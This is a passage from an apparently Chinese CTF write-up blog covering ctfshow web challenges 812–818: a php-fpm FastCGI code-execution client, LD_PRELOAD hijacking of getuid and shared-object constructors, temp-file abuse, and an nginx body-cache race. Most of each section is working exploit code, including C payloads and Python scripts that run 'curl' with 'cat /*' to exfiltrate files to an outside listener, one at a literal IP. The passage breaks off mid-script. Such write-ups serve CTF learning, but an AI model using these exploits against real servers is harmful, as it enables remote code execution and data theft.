self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php system(&quot;cat /flagfile&quot;); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">28163</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    <span class="built_in">print</span>(force_text(response))</span><br></pre></td></tr></table></figure><p>命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 fpm.py -c <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> -p 28046 pwn.challenge.ctf.show /usr/<span class="built_in">local</span>/lib/php/System.php</span><br></pre></td></tr></table></figure><p>运行得到flag<br>报500了，我没成功（泪目）</p><h1 id="web813（劫持mysqli）"><a href="#web813（劫持mysqli）" class="headerlink" title="web813（劫持mysqli）"></a>web813（劫持mysqli）</h1><h2 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h2><p><img src="https://img-blog.csdnimg.cn/83bd15d8124245a6836b0a98d08b18da.png"><br><a href="https://juejin.cn/post/7093311358426415135#heading-5">大佬博客</a><br><a href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166278060316782417034638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166278060316782417034638&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142%5Ev47%5Econtrol,201%5Ev3%5Eadd_ask&utm_term=ctfshow811&spm=1018.2226.3001.4187#web813_306">yu师傅博客</a><br>恶意so文件弄出来了，但是却没有成功反弹shell</p><h1 id="web814（劫持getuid）"><a href="#web814（劫持getuid）" class="headerlink" title="web814（劫持getuid）"></a>web814（劫持getuid）</h1><h2 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h2><p><img src="https://img-blog.csdnimg.cn/11562af38def4131b9d36b556808367b.png"></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p><a href="https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">LD_PRELOAD学习</a><br><img src="https://img-blog.csdnimg.cn/13223f4ef27b43ecb21b9693c3c41792.png"><br><img src="https://img-blog.csdnimg.cn/6b4cee74ee33412c8151a4a7e4bc383a.png"></p><p><img src="https://img-blog.csdnimg.cn/00de771d13f5445bb009c4579738d321.png"><br><img src="https://img-blog.csdnimg.cn/3d80243d00fa47fd8e9a36fdf9994de7.png"></p><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>利用脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后进行编译成so文件<br>gcc -c -fPIC xin.c -o xin&amp;&amp;gcc –share xin -o xin.so<br>之后将文件上传到临时目录下，将LD_PRELOAD的路径通过putenv重定向为tmp目录下创建进程执行getuid函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/hack.so&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?a=write&#x27;</span>,data=data)</span><br><span class="line">requests.get(url+<span class="string">&#x27;?a=run&amp;env=LD_PRELOAD=/tmp/hack.so&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="web815（劫持构造器）"><a href="#web815（劫持构造器）" class="headerlink" title="web815（劫持构造器）"></a>web815（劫持构造器）</h1><p>本题由于存在mail函数因此可以利用第二种方法进行getshell<br>另一种方法：<br>如果利用第二种方法，则<br><img src="https://img-blog.csdnimg.cn/f28964f6f30f4fd29e20eb17d8a23ac6.png"><br>下面的一个比较通用：</p><p>在GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor)) 修饰的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">hack</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;curl http://xxx:4567?s=`cat /*`&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc -c -fPIC xin.c -o xin&amp;&amp;gcc –share xin -o xin.so<br>得到so文件上传拿到shell</p><h1 id="web816（临时文件利用）"><a href="#web816（临时文件利用）" class="headerlink" title="web816（临时文件利用）"></a>web816（临时文件利用）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-26 14:19:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-27 08:34:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    putenv(<span class="variable">$env</span>.scandir(<span class="string">&quot;/tmp&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line">    system(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到题目后知道应该上传恶意so文件来进行getshell，按时看到题目没有上传点一时无法下手<br>看大佬博客后发现<br>我们将恶意so文件上传上去，会作为临时文件保存到/tmp/目录下<br>然后有$env.scandir(“/tmp”)[2]得到临时文件路径，从而达到利用LD_PRELOAD的环境变量来RCE<br><strong>注意</strong>：一般临时文件上传上去，不好拿到文件名于是利用scandir(“/tmp”)[2]得到文件名<br>上传815产生的so文件，利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;url/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><h1 id="web817（利用nginx的body-fastcgi缓存机制）"><a href="#web817（利用nginx的body-fastcgi缓存机制）" class="headerlink" title="web817（利用nginx的body/fastcgi缓存机制）"></a>web817（利用nginx的body/fastcgi缓存机制）</h1><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; preg_match(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">shell_exec(shell_exec(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>考点</strong>：<br>让后端 php 请求一个过大的文件<br>当body过大时，导致 Nginx 需要产生临时文件进行缓存<br>虽然Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件<br>遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI<br><strong>包含/proc/pid/fd/条件</strong><br><img src="https://img-blog.csdnimg.cn/44869dad812245428be9c02b8b815fca.png"><br><img src="https://img-blog.csdnimg.cn/ef5b1df54a4b412f847343d9ab49e4c6.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span></span><br></pre></td></tr></table></figure><p>大概意思就是以/开头，并且后面只能有数字字母和/<br><a href="https://tttang.com/archive/1384/#toc_0x00">大佬博客</a><br>利用师傅脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  threading, requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port= <span class="number">28053</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line"></span><br><span class="line">con=<span class="string">&quot;curl http://101.34.94.44:4567?`cat /f*`;&quot;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1024</span>*<span class="number">500</span></span><br><span class="line">l = <span class="built_in">len</span>(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">x=<span class="string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;con&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">s.send(x)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruter</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web818（利用nginx的body缓存机制）"><a href="#web818（利用nginx的body缓存机制）" class="headerlink" title="web818（利用nginx的body缓存机制）"></a>web818（利用nginx的body缓存机制）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">putenv(<span class="variable">$env</span>);</span><br><span class="line">system(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">system(<span class="string">&quot;ps aux&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理和817相似<br>利用nginx的body缓存机制<br>上传一个so文件(so文件可以看下815、814）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span>  threading, requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port= <span class="number">28133</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span 